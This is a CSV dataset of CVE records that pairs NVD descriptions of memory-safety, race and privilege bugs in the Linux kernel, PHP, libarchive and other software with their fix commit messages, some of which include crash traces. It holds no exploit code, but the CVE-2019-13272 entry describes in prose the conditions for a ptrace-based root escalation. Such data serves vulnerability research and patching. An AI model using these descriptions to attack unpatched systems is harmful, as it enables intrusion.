cveID,cweID,publishedDate,cveDescription,commitMsg
CVE-2013-3302,CWE-362,2013-04-29,Race condition in the smb_send_rqst function in fs/cifs/transport.c in the Linux kernel before 3.7.2 allows local users to cause a denial of service (NULL pointer dereference and OOPS) or possibly have unspecified other impact via vectors involving a reconnection event.,"Cai reported this oops:  [90701.616664] BUG: unable to handle kernel NULL pointer dereference at 0000000000000028 [90701.625438] IP: [<ffffffff814a343e>] kernel_setsockopt+0x2e/0x60 [90701.632167] PGD fea319067 PUD 103fda4067 PMD 0 [90701.637255] Oops: 0000 [#1] SMP [90701.640878] Modules linked in: des_generic md4 nls_utf8 cifs dns_resolver binfmt_misc tun sg igb iTCO_wdt iTCO_vendor_support lpc_ich pcspkr i2c_i801 i2c_core i7core_edac edac_core ioatdma dca mfd_core coretemp kvm_intel kvm crc32c_intel microcode sr_mod cdrom ata_generic sd_mod pata_acpi crc_t10dif ata_piix libata megaraid_sas dm_mirror dm_region_hash dm_log dm_mod [90701.677655] CPU 10 [90701.679808] Pid: 9627, comm: ls Tainted: G        W    3.7.1+ #10 QCI QSSC-S4R/QSSC-S4R [90701.688950] RIP: 0010:[<ffffffff814a343e>]  [<ffffffff814a343e>] kernel_setsockopt+0x2e/0x60 [90701.698383] RSP: 0018:ffff88177b431bb8  EFLAGS: 00010206 [90701.704309] RAX: ffff88177b431fd8 RBX: 00007ffffffff000 RCX: ffff88177b431bec [90701.712271] RDX: 0000000000000003 RSI: 0000000000000006 RDI: 0000000000000000 [90701.720223] RBP: ffff88177b431bc8 R08: 0000000000000004 R09: 0000000000000000 [90701.728185] R10: 0000000000000001 R11: 0000000000000000 R12: 0000000000000001 [90701.736147] R13: ffff88184ef92000 R14: 0000000000000023 R15: ffff88177b431c88 [90701.744109] FS:  00007fd56a1a47c0(0000) GS:ffff88105fc40000(0000) knlGS:0000000000000000 [90701.753137] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b [90701.759550] CR2: 0000000000000028 CR3: 000000104f15f000 CR4: 00000000000007e0 [90701.767512] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 [90701.775465] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400 [90701.783428] Process ls (pid: 9627, threadinfo ffff88177b430000, task ffff88185ca4cb60) [90701.792261] Stack: [90701.794505]  0000000000000023 ffff88177b431c50 ffff88177b431c38 ffffffffa014fcb1 [90701.802809]  ffff88184ef921bc 0000000000000000 00000001ffffffff ffff88184ef921c0 [90701.811123]  ffff88177b431c08 ffffffff815ca3d9 ffff88177b431c18 ffff880857758000 [90701.819433] Call Trace: [90701.822183]  [<ffffffffa014fcb1>] smb_send_rqst+0x71/0x1f0 [cifs] [90701.828991]  [<ffffffff815ca3d9>] ? schedule+0x29/0x70 [90701.834736]  [<ffffffffa014fe6d>] smb_sendv+0x3d/0x40 [cifs] [90701.841062]  [<ffffffffa014fe96>] smb_send+0x26/0x30 [cifs] [90701.847291]  [<ffffffffa015801f>] send_nt_cancel+0x6f/0xd0 [cifs] [90701.854102]  [<ffffffffa015075e>] SendReceive+0x18e/0x360 [cifs] [90701.860814]  [<ffffffffa0134a78>] CIFSFindFirst+0x1a8/0x3f0 [cifs] [90701.867724]  [<ffffffffa013f731>] ? build_path_from_dentry+0xf1/0x260 [cifs] [90701.875601]  [<ffffffffa013f731>] ? build_path_from_dentry+0xf1/0x260 [cifs] [90701.883477]  [<ffffffffa01578e6>] cifs_query_dir_first+0x26/0x30 [cifs] [90701.890869]  [<ffffffffa015480d>] initiate_cifs_search+0xed/0x250 [cifs] [90701.898354]  [<ffffffff81195970>] ? fillonedir+0x100/0x100 [90701.904486]  [<ffffffffa01554cb>] cifs_readdir+0x45b/0x8f0 [cifs] [90701.911288]  [<ffffffff81195970>] ? fillonedir+0x100/0x100 [90701.917410]  [<ffffffff81195970>] ? fillonedir+0x100/0x100 [90701.923533]  [<ffffffff81195970>] ? fillonedir+0x100/0x100 [90701.929657]  [<ffffffff81195848>] vfs_readdir+0xb8/0xe0 [90701.935490]  [<ffffffff81195b9f>] sys_getdents+0x8f/0x110 [90701.941521]  [<ffffffff815d3b99>] system_call_fastpath+0x16/0x1b [90701.948222] Code: 66 90 55 65 48 8b 04 25 f0 c6 00 00 48 89 e5 53 48 83 ec 08 83 fe 01 48 8b 98 48 e0 ff ff 48 c7 80 48 e0 ff ff ff ff ff ff 74 22 <48> 8b 47 28 ff 50 68 65 48 8b 14 25 f0 c6 00 00 48 89 9a 48 e0 [90701.970313] RIP  [<ffffffff814a343e>] kernel_setsockopt+0x2e/0x60 [90701.977125]  RSP <ffff88177b431bb8> [90701.981018] CR2: 0000000000000028 [90701.984809] ---[ end trace 24bd602971110a43 ]---  This is likely due to a race vs. a reconnection event.  The current code checks for a NULL socket in smb_send_kvec, but that's too late. By the time that check is done, the socket will already have been passed to kernel_setsockopt. Move the check into smb_send_rqst, so that it's checked earlier.  In truth, this is a bit of a half-assed fix. The -ENOTSOCK error return here looks like it could bubble back up to userspace. The locking rules around the ssocket pointer are really unclear as well. There are cases where the ssocket pointer is changed without holding the srv_mutex, but I'm not clear whether there's a potential race here yet or not.  This code seems like it could benefit from some fundamental re-think of how the socket handling should behave. Until then though, this patch should at least fix the above oops in most cases.  Cc: <stable@vger.kernel.org> # 3.7+ Reported-and-Tested-by: CAI Qian <caiqian@redhat.com> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <smfrench@gmail.com>"
CVE-2019-13272,,2019-07-17,"In the Linux kernel before 5.1.17, ptrace_link in kernel/ptrace.c mishandles the recording of the credentials of a process that wants to create a ptrace relationship, which allows local users to obtain root access by leveraging certain scenarios with a parent-child process relationship, where a parent drops privileges and calls execve (potentially allowing control by an attacker). One contributing factor is an object lifetime issue (which can also cause a panic). Another contributing factor is incorrect marking of a ptrace relationship as privileged, which is exploitable through (for example) Polkit's pkexec helper with PTRACE_TRACEME. NOTE: SELinux deny_ptrace might be a usable workaround in some environments.","Fix two issues:  When called for PTRACE_TRACEME, ptrace_link() would obtain an RCU reference to the parent's objective credentials, then give that pointer to get_cred().  However, the object lifetime rules for things like struct cred do not permit unconditionally turning an RCU reference into a stable reference.  PTRACE_TRACEME records the parent's credentials as if the parent was acting as the subject, but that's not the case.  If a malicious unprivileged child uses PTRACE_TRACEME and the parent is privileged, and at a later point, the parent process becomes attacker-controlled (because it drops privileges and calls execve()), the attacker ends up with control over two processes with a privileged ptrace relationship, which can be abused to ptrace a suid binary and obtain root privileges.  Fix both of these by always recording the credentials of the process that is requesting the creation of the ptrace relationship: current_cred() can't change under us, and current is the proper subject for access control.  This change is theoretically userspace-visible, but I am not aware of any code that it will actually break.  Fixes: 64b875f (""ptrace: Capture the ptracer's creds not PT_PTRACE_CAP"") Signed-off-by: Jann Horn <jannh@google.com> Acked-by: Oleg Nesterov <oleg@redhat.com> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-5340,CWE-190,2017-01-11,"Zend/zend_hash.c in PHP before 7.0.15 and 7.1.x before 7.1.1 mishandles certain cases that require large array allocations, which allows remote attackers to execute arbitrary code or cause a denial of service (integer overflow, uninitialized memory access, and use of arbitrary destructor function pointers) via crafted serialized data.",
CVE-2017-11714,CWE-125,2017-07-28,"psi/ztoken.c in Artifex Ghostscript 9.21 mishandles references to the scanner state structure, which allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted PostScript document, related to an out-of-bounds read in the igc_reloc_struct_ptr function in psi/igc.c.",
CVE-2018-12248,CWE-125,2018-06-12,An issue was discovered in mruby 1.4.1. There is a heap-based buffer over-read associated with OP_ENTER because mrbgems/mruby-fiber/src/fiber.c does not extend the stack in cases of many arguments to fiber.,
CVE-2017-6415,CWE-476,2017-03-02,The dex_parse_debug_item function in libr/bin/p/bin_dex.c in radare2 1.2.1 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via a crafted DEX file.,
CVE-2014-9756,CWE-369,2015-11-19,The psf_fwrite function in file_io.c in libsndfile allows attackers to cause a denial of service (divide-by-zero error and application crash) via unspecified vectors related to the headindex variable.,Closes: #92
CVE-2013-4220,,2013-08-25,The bad_mode function in arch/arm64/kernel/traps.c in the Linux kernel before 3.9.5 on the ARM64 platform allows local users to cause a denial of service (system crash) via vectors involving an attempted register access that triggers an unexpected value in the Exception Syndrome Register (ESR).,"Rather than completely killing the kernel if we receive an esr value we can't deal with in the el0 handlers, send the process a SIGILL and log the esr value in the hope that we can debug it. If we receive a bad esr from el1, we'll die() as before.  Signed-off-by: Mark Rutland <mark.rutland@arm.com> Signed-off-by: Catalin Marinas <catalin.marinas@arm.com> Cc: stable@vger.kernel.org"
CVE-2016-10504,CWE-119,2017-08-30,Heap-based buffer overflow vulnerability in the opj_mqc_byteout function in mqc.c in OpenJPEG before 2.2.0 allows remote attackers to cause a denial of service (application crash) via a crafted bmp file.,
CVE-2013-0290,CWE-20,2013-02-19,"The __skb_recv_datagram function in net/core/datagram.c in the Linux kernel before 3.8 does not properly handle the MSG_PEEK flag with zero-length data, which allows local users to cause a denial of service (infinite loop and system hang) via a crafted application.","Tommi was fuzzing with trinity and reported the following problem :  commit 3f518bf (datagram: Add offset argument to __skb_recv_datagram) missed that a raw socket receive queue can contain skbs with no payload.  We can loop in __skb_recv_datagram() with MSG_PEEK mode, because wait_for_packet() is not prepared to skip these skbs.  [   83.541011] INFO: rcu_sched detected stalls on CPUs/tasks: {} (detected by 0, t=26002 jiffies, g=27673, c=27672, q=75) [   83.541011] INFO: Stall ended before state dump start [  108.067010] BUG: soft lockup - CPU#0 stuck for 22s! [trinity-child31:2847] ... [  108.067010] Call Trace: [  108.067010]  [<ffffffff818cc103>] __skb_recv_datagram+0x1a3/0x3b0 [  108.067010]  [<ffffffff818cc33d>] skb_recv_datagram+0x2d/0x30 [  108.067010]  [<ffffffff819ed43d>] rawv6_recvmsg+0xad/0x240 [  108.067010]  [<ffffffff818c4b04>] sock_common_recvmsg+0x34/0x50 [  108.067010]  [<ffffffff818bc8ec>] sock_recvmsg+0xbc/0xf0 [  108.067010]  [<ffffffff818bf31e>] sys_recvfrom+0xde/0x150 [  108.067010]  [<ffffffff81ca4329>] system_call_fastpath+0x16/0x1b  Reported-by: Tommi Rantala <tt.rantala@gmail.com> Tested-by: Tommi Rantala <tt.rantala@gmail.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Cc: Pavel Emelyanov <xemul@parallels.com> Acked-by: Pavel Emelyanov <xemul@parallels.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-10130,CWE-284,2017-03-24,The http_connect function in transports/http.c in libgit2 before 0.24.6 and 0.25.x before 0.25.1 might allow man-in-the-middle attackers to spoof servers by leveraging clobbering of the error variable.,
CVE-2016-10741,CWE-362,2019-02-01,"In the Linux kernel before 4.9.3, fs/xfs/xfs_aops.c allows local users to cause a denial of service (system crash) because there is a race condition between direct and memory-mapped I/O (associated with a hole) that is handled with BUG_ON instead of an I/O failure.","We've had reports of generic/095 causing XFS to BUG() in __xfs_get_blocks() due to the existence of delalloc blocks on a direct I/O read. generic/095 issues a mix of various types of I/O, including direct and memory mapped I/O to a single file. This is clearly not supported behavior and is known to lead to such problems. E.g., the lack of exclusion between the direct I/O and write fault paths means that a write fault can allocate delalloc blocks in a region of a file that was previously a hole after the direct read has attempted to flush/inval the file range, but before it actually reads the block mapping. In turn, the direct read discovers a delalloc extent and cannot proceed.  While the appropriate solution here is to not mix direct and memory mapped I/O to the same regions of the same file, the current BUG_ON() behavior is probably overkill as it can crash the entire system.  Instead, localize the failure to the I/O in question by returning an error for a direct I/O that cannot be handled safely due to delalloc blocks. Be careful to allow the case of a direct write to post-eof delalloc blocks. This can occur due to speculative preallocation and is safe as post-eof blocks are not accompanied by dirty pages in pagecache (conversely, preallocation within eof must have been zeroed, and thus dirtied, before the inode size could have been increased beyond said blocks).  Finally, provide an additional warning if a direct I/O write occurs while the file is memory mapped. This may not catch all problematic scenarios, but provides a hint that some known-to-be-problematic I/O methods are in use.  Signed-off-by: Brian Foster <bfoster@redhat.com> Reviewed-by: Dave Chinner <dchinner@redhat.com> Signed-off-by: Dave Chinner <david@fromorbit.com>"
CVE-2016-8688,CWE-125,2017-02-15,"The mtree bidder in libarchive 3.2.1 does not keep track of line sizes when extending the read-ahead, which allows remote attackers to cause a denial of service (crash) via a crafted file, which triggers an invalid read in the (1) detect_form or (2) bid_entry function in libarchive/archive_read_support_format_mtree.c.",
CVE-2016-5844,CWE-190,2016-09-21,Integer overflow in the ISO parser in libarchive before 3.2.1 allows remote attackers to cause a denial of service (application crash) via a crafted ISO file.,"The multiplication here defaulted to 'int' but calculations of file positions should always use int64_t.  A simple cast suffices to fix this since the base location is always 32 bits for ISO, so multiplying by the sector size will never overflow a 64-bit integer."
CVE-2017-15951,CWE-20,2017-10-28,"The KEYS subsystem in the Linux kernel before 4.13.10 does not correctly synchronize the actions of updating versus finding a key in the ""negative"" state to avoid a race condition, which allows local users to cause a denial of service or possibly have unspecified other impact via crafted system calls.","Consolidate KEY_FLAG_INSTANTIATED, KEY_FLAG_NEGATIVE and the rejection error into one field such that:   (1) The instantiation state can be modified/read atomically.   (2) The error can be accessed atomically with the state.   (3) The error isn't stored unioned with the payload pointers.  This deals with the problem that the state is spread over three different objects (two bits and a separate variable) and reading or updating them atomically isn't practical, given that not only can uninstantiated keys change into instantiated or rejected keys, but rejected keys can also turn into instantiated keys - and someone accessing the key might not be using any locking.  The main side effect of this problem is that what was held in the payload may change, depending on the state.  For instance, you might observe the key to be in the rejected state.  You then read the cached error, but if the key semaphore wasn't locked, the key might've become instantiated between the two reads - and you might now have something in hand that isn't actually an error code.  The state is now KEY_IS_UNINSTANTIATED, KEY_IS_POSITIVE or a negative error code if the key is negatively instantiated.  The key_is_instantiated() function is replaced with key_is_positive() to avoid confusion as negative keys are also 'instantiated'.  Additionally, barriering is included:   (1) Order payload-set before state-set during instantiation.   (2) Order state-read before payload-read when using the key.  Further separate barriering is necessary if RCU is being used to access the payload content after reading the payload pointers.  Fixes: 146aa8b (""KEYS: Merge the type-specific data with the payload data"") Cc: stable@vger.kernel.org # v4.4+ Reported-by: Eric Biggers <ebiggers@google.com> Signed-off-by: David Howells <dhowells@redhat.com> Reviewed-by: Eric Biggers <ebiggers@google.com>"
CVE-2016-7913,CWE-416,2016-11-16,The xc2028_set_config function in drivers/media/tuners/tuner-xc2028.c in the Linux kernel before 4.6 allows local users to gain privileges or cause a denial of service (use-after-free) via vectors involving omission of the firmware name from a certain data structure.,"If struct xc2028_config is passed without a firmware name, the following trouble may happen:  [11009.907205] xc2028 5-0061: type set to XCeive xc2028/xc3028 tuner [11009.907491] ================================================================== [11009.907750] BUG: KASAN: use-after-free in strcmp+0x96/0xb0 at addr ffff8803bd78ab40 [11009.907992] Read of size 1 by task modprobe/28992 [11009.907994] ============================================================================= [11009.907997] BUG kmalloc-16 (Tainted: G        W      ): kasan: bad access detected [11009.907999] -----------------------------------------------------------------------------  [11009.908008] INFO: Allocated in xhci_urb_enqueue+0x214/0x14c0 [xhci_hcd] age=0 cpu=3 pid=28992 [11009.908012] 	___slab_alloc+0x581/0x5b0 [11009.908014] 	__slab_alloc+0x51/0x90 [11009.908017] 	__kmalloc+0x27b/0x350 [11009.908022] 	xhci_urb_enqueue+0x214/0x14c0 [xhci_hcd] [11009.908026] 	usb_hcd_submit_urb+0x1e8/0x1c60 [11009.908029] 	usb_submit_urb+0xb0e/0x1200 [11009.908032] 	usb_serial_generic_write_start+0xb6/0x4c0 [11009.908035] 	usb_serial_generic_write+0x92/0xc0 [11009.908039] 	usb_console_write+0x38a/0x560 [11009.908045] 	call_console_drivers.constprop.14+0x1ee/0x2c0 [11009.908051] 	console_unlock+0x40d/0x900 [11009.908056] 	vprintk_emit+0x4b4/0x830 [11009.908061] 	vprintk_default+0x1f/0x30 [11009.908064] 	printk+0x99/0xb5 [11009.908067] 	kasan_report_error+0x10a/0x550 [11009.908070] 	__asan_report_load1_noabort+0x43/0x50 [11009.908074] INFO: Freed in xc2028_set_config+0x90/0x630 [tuner_xc2028] age=1 cpu=3 pid=28992 [11009.908077] 	__slab_free+0x2ec/0x460 [11009.908080] 	kfree+0x266/0x280 [11009.908083] 	xc2028_set_config+0x90/0x630 [tuner_xc2028] [11009.908086] 	xc2028_attach+0x310/0x8a0 [tuner_xc2028] [11009.908090] 	em28xx_attach_xc3028.constprop.7+0x1f9/0x30d [em28xx_dvb] [11009.908094] 	em28xx_dvb_init.part.3+0x8e4/0x5cf4 [em28xx_dvb] [11009.908098] 	em28xx_dvb_init+0x81/0x8a [em28xx_dvb] [11009.908101] 	em28xx_register_extension+0xd9/0x190 [em28xx] [11009.908105] 	em28xx_dvb_register+0x10/0x1000 [em28xx_dvb] [11009.908108] 	do_one_initcall+0x141/0x300 [11009.908111] 	do_init_module+0x1d0/0x5ad [11009.908114] 	load_module+0x6666/0x9ba0 [11009.908117] 	SyS_finit_module+0x108/0x130 [11009.908120] 	entry_SYSCALL_64_fastpath+0x16/0x76 [11009.908123] INFO: Slab 0xffffea000ef5e280 objects=25 used=25 fp=0x          (null) flags=0x2ffff8000004080 [11009.908126] INFO: Object 0xffff8803bd78ab40 @offset=2880 fp=0x0000000000000001  [11009.908130] Bytes b4 ffff8803bd78ab30: 01 00 00 00 2a 07 00 00 9d 28 00 00 01 00 00 00  ....*....(...... [11009.908133] Object ffff8803bd78ab40: 01 00 00 00 00 00 00 00 b0 1d c3 6a 00 88 ff ff  ...........j.... [11009.908137] CPU: 3 PID: 28992 Comm: modprobe Tainted: G    B   W       4.5.0-rc1+ #43 [11009.908140] Hardware name:                  /NUC5i7RYB, BIOS RYBDWi35.86A.0350.2015.0812.1722 08/12/2015 [11009.908142]  ffff8803bd78a000 ffff8802c273f1b8 ffffffff81932007 ffff8803c6407a80 [11009.908148]  ffff8802c273f1e8 ffffffff81556759 ffff8803c6407a80 ffffea000ef5e280 [11009.908153]  ffff8803bd78ab40 dffffc0000000000 ffff8802c273f210 ffffffff8155ccb4 [11009.908158] Call Trace: [11009.908162]  [<ffffffff81932007>] dump_stack+0x4b/0x64 [11009.908165]  [<ffffffff81556759>] print_trailer+0xf9/0x150 [11009.908168]  [<ffffffff8155ccb4>] object_err+0x34/0x40 [11009.908171]  [<ffffffff8155f260>] kasan_report_error+0x230/0x550 [11009.908175]  [<ffffffff81237d71>] ? trace_hardirqs_off_caller+0x21/0x290 [11009.908179]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36/0x50 [11009.908182]  [<ffffffff8155f5c3>] __asan_report_load1_noabort+0x43/0x50 [11009.908185]  [<ffffffff8155ea00>] ? __asan_register_globals+0x50/0xa0 [11009.908189]  [<ffffffff8194cea6>] ? strcmp+0x96/0xb0 [11009.908192]  [<ffffffff8194cea6>] strcmp+0x96/0xb0 [11009.908196]  [<ffffffffa13ba4ac>] xc2028_set_config+0x15c/0x630 [tuner_xc2028] [11009.908200]  [<ffffffffa13bac90>] xc2028_attach+0x310/0x8a0 [tuner_xc2028] [11009.908203]  [<ffffffff8155ea78>] ? memset+0x28/0x30 [11009.908206]  [<ffffffffa13ba980>] ? xc2028_set_config+0x630/0x630 [tuner_xc2028] [11009.908211]  [<ffffffffa157a59a>] em28xx_attach_xc3028.constprop.7+0x1f9/0x30d [em28xx_dvb] [11009.908215]  [<ffffffffa157aa2a>] ? em28xx_dvb_init.part.3+0x37c/0x5cf4 [em28xx_dvb] [11009.908219]  [<ffffffffa157a3a1>] ? hauppauge_hvr930c_init+0x487/0x487 [em28xx_dvb] [11009.908222]  [<ffffffffa01795ac>] ? lgdt330x_attach+0x1cc/0x370 [lgdt330x] [11009.908226]  [<ffffffffa01793e0>] ? i2c_read_demod_bytes.isra.2+0x210/0x210 [lgdt330x] [11009.908230]  [<ffffffff812e87d0>] ? ref_module.part.15+0x10/0x10 [11009.908233]  [<ffffffff812e56e0>] ? module_assert_mutex_or_preempt+0x80/0x80 [11009.908238]  [<ffffffffa157af92>] em28xx_dvb_init.part.3+0x8e4/0x5cf4 [em28xx_dvb] [11009.908242]  [<ffffffffa157a6ae>] ? em28xx_attach_xc3028.constprop.7+0x30d/0x30d [em28xx_dvb] [11009.908245]  [<ffffffff8195222d>] ? string+0x14d/0x1f0 [11009.908249]  [<ffffffff8195381f>] ? symbol_string+0xff/0x1a0 [11009.908253]  [<ffffffff81953720>] ? uuid_string+0x6f0/0x6f0 [11009.908257]  [<ffffffff811a775e>] ? __kernel_text_address+0x7e/0xa0 [11009.908260]  [<ffffffff8104b02f>] ? print_context_stack+0x7f/0xf0 [11009.908264]  [<ffffffff812e9846>] ? __module_address+0xb6/0x360 [11009.908268]  [<ffffffff8137fdc9>] ? is_ftrace_trampoline+0x99/0xe0 [11009.908271]  [<ffffffff811a775e>] ? __kernel_text_address+0x7e/0xa0 [11009.908275]  [<ffffffff81240a70>] ? debug_check_no_locks_freed+0x290/0x290 [11009.908278]  [<ffffffff8104a24b>] ? dump_trace+0x11b/0x300 [11009.908282]  [<ffffffffa13e8143>] ? em28xx_register_extension+0x23/0x190 [em28xx] [11009.908285]  [<ffffffff81237d71>] ? trace_hardirqs_off_caller+0x21/0x290 [11009.908289]  [<ffffffff8123ff56>] ? trace_hardirqs_on_caller+0x16/0x590 [11009.908292]  [<ffffffff812404dd>] ? trace_hardirqs_on+0xd/0x10 [11009.908296]  [<ffffffffa13e8143>] ? em28xx_register_extension+0x23/0x190 [em28xx] [11009.908299]  [<ffffffff822dcbb0>] ? mutex_trylock+0x400/0x400 [11009.908302]  [<ffffffff810021a1>] ? do_one_initcall+0x131/0x300 [11009.908306]  [<ffffffff81296dc7>] ? call_rcu_sched+0x17/0x20 [11009.908309]  [<ffffffff8159e708>] ? put_object+0x48/0x70 [11009.908314]  [<ffffffffa1579f11>] em28xx_dvb_init+0x81/0x8a [em28xx_dvb] [11009.908317]  [<ffffffffa13e81f9>] em28xx_register_extension+0xd9/0x190 [em28xx] [11009.908320]  [<ffffffffa0150000>] ? 0xffffffffa0150000 [11009.908324]  [<ffffffffa0150010>] em28xx_dvb_register+0x10/0x1000 [em28xx_dvb] [11009.908327]  [<ffffffff810021b1>] do_one_initcall+0x141/0x300 [11009.908330]  [<ffffffff81002070>] ? try_to_run_init_process+0x40/0x40 [11009.908333]  [<ffffffff8123ff56>] ? trace_hardirqs_on_caller+0x16/0x590 [11009.908337]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36/0x50 [11009.908340]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36/0x50 [11009.908343]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36/0x50 [11009.908346]  [<ffffffff8155ea37>] ? __asan_register_globals+0x87/0xa0 [11009.908350]  [<ffffffff8144da7b>] do_init_module+0x1d0/0x5ad [11009.908353]  [<ffffffff812f2626>] load_module+0x6666/0x9ba0 [11009.908356]  [<ffffffff812e9c90>] ? symbol_put_addr+0x50/0x50 [11009.908361]  [<ffffffffa1580037>] ? em28xx_dvb_init.part.3+0x5989/0x5cf4 [em28xx_dvb] [11009.908366]  [<ffffffff812ebfc0>] ? module_frob_arch_sections+0x20/0x20 [11009.908369]  [<ffffffff815bc940>] ? open_exec+0x50/0x50 [11009.908374]  [<ffffffff811671bb>] ? ns_capable+0x5b/0xd0 [11009.908377]  [<ffffffff812f5e58>] SyS_finit_module+0x108/0x130 [11009.908379]  [<ffffffff812f5d50>] ? SyS_init_module+0x1f0/0x1f0 [11009.908383]  [<ffffffff81004044>] ? lockdep_sys_exit_thunk+0x12/0x14 [11009.908394]  [<ffffffff822e6936>] entry_SYSCALL_64_fastpath+0x16/0x76 [11009.908396] Memory state around the buggy address: [11009.908398]  ffff8803bd78aa00: 00 00 fc fc fc fc fc fc fc fc fc fc fc fc fc fc [11009.908401]  ffff8803bd78aa80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [11009.908403] >ffff8803bd78ab00: fc fc fc fc fc fc fc fc 00 00 fc fc fc fc fc fc [11009.908405]                                            ^ [11009.908407]  ffff8803bd78ab80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [11009.908409]  ffff8803bd78ac00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [11009.908411] ==================================================================  In order to avoid it, let's set the cached value of the firmware name to NULL after freeing it. While here, return an error if the memory allocation fails.  Signed-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>"
